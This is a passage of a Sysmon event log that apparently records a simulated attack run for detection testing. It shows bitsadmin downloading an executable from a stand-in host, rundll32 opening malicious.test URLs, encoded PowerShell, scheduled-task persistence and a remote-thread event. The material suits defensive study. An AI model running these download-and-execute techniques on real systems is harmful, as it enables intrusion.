IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-9282-6928-ee10-000000000b00}
ParentProcessId: 5996
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/4 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:47 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:47.081
ProcessGuid: {3a35410f-9283-6928-fe10-000000000b00}
ProcessId: 13408
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwA0ACcA 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.980
ProcessGuid: {3a35410f-9282-6928-fc10-000000000b00}
ProcessId: 5820
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:16.244
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 59180
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:46 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:03:46.883
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask4
CreationUtcTime: 2025-11-27 18:03:46.883
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.825
ProcessGuid: {3a35410f-9282-6928-fa10-000000000b00}
ProcessId: 12564
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=11 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11531073071 --metrics-shmem-handle=5708,i,6298917953706991092,10011587003154608761,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708996619331833 --mojo-platform-channel-handle=5716 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.799
ProcessGuid: {3a35410f-9282-6928-f910-000000000b00}
ProcessId: 10572
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job4 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.732
ProcessGuid: {3a35410f-9282-6928-f710-000000000b00}
ProcessId: 1284
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job4 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.681
ProcessGuid: {3a35410f-9282-6928-f510-000000000b00}
ProcessId: 4244
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job4 http://example.com/file.exe C:\Temp\file4.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.626
ProcessGuid: {3a35410f-9282-6928-f310-000000000b00}
ProcessId: 12372
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job4 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.590
ProcessGuid: {3a35410f-9282-6928-f110-000000000b00}
ProcessId: 13900
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask4 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.510
ProcessGuid: {3a35410f-9282-6928-ef10-000000000b00}
ProcessId: 12740
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask4 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:46 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:46.454
ProcessGuid: {3a35410f-9282-6928-ee10-000000000b00}
ProcessId: 5996
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/4 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:45 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:45.169
ProcessGuid: {3a35410f-927f-6928-e710-000000000b00}
ProcessId: 7956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_nh0ohjbw.1vy.ps1
CreationUtcTime: 2025-11-27 18:03:45.169
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.556
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57043
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 172.65.55.248
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.473
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57040
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.472
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57038
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.463
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57036
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.459
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57035
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.448
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57039
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.228
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 55151
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.227
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 64992
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:45 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.227
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 49459
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:44 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:03:44.870
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-9280-6928-ed10-000000000b00}
TargetProcessId: 15220
TargetImage: <unknown process>
NewThreadId: 14936
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:44 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.145
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57033
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 18.161.216.66
DestinationHostname: server-18-161-216-66.blr50.r.cloudfront.net
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:44 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.144
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57034
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 172.65.55.248
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:44 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.144
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57025
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:44 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.144
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57028
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:44 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.144
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57030
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:44 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:15.096
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57027
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 35.162.132.61
DestinationHostname: ec2-35-162-132-61.us-west-2.compute.amazonaws.com
DestinationPort: 443
DestinationPortName: https"
